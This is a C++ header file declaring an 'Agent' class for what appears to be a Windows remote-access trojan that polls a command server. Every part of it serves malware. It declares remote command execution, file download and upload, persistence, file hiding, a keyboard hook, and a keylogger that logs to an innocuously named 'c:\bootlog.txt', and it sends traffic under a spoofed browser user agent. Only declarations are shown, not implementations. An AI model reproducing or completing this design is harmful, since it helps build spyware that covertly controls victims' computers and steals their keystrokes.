#pragma once
#pragma comment (lib,"wininet.lib")

#include "includes.h"
#include "define.h"

typedef struct _MYHOOKDATA
{
	int nType;
	HOOKPROC hkprc;
	HHOOK hhook;
} MYHOOKDATA;

class Agent {

public:

	Agent(const std::string& _server_url, const std::string& _botid = "", const unsigned int _sleep_interval = 10, const std::string& _service_name = "agent", 
		const std::string& _user_agent = "Mozilla/4.0 (compatible)", const std::string& _KeyloggerFile = "c:\bootlog.txt");

	std::string run_command(const std::string& command, bool isLocal=false);
	void cd(const std::string& newdir);
	void download(const std::string& url);
	void upload(const std::string& filename);
	void persist(const std::string& options);
	void open(const std::string& args);
	void hide_unhide_file(const std::string& filename);
	void keylogger(bool state = false);
	void help();
	
	void setInterval(const unsigned int new_interval);
	void setServiceName(const std::string& new_servicename);
	void setKeyloggerFile(const std::string& new_KeyloggerFile);

	void run();
	void execute(const std::string& commandline);
	void stop();

private:

	std::string get_hostname();
	std::string get_os_name();
	std::string get_wd();
	std::string get_next_command();
	void send_output(const std::string& output);
	void wait_for_tick();

	std::string botid;
	std::string os_name;
	std::string server_url;
	unsigned int sleep_interval;
	std::string service_name;
	std::string user_agent;
	bool running;
	HANDLE keylogger_task;
};
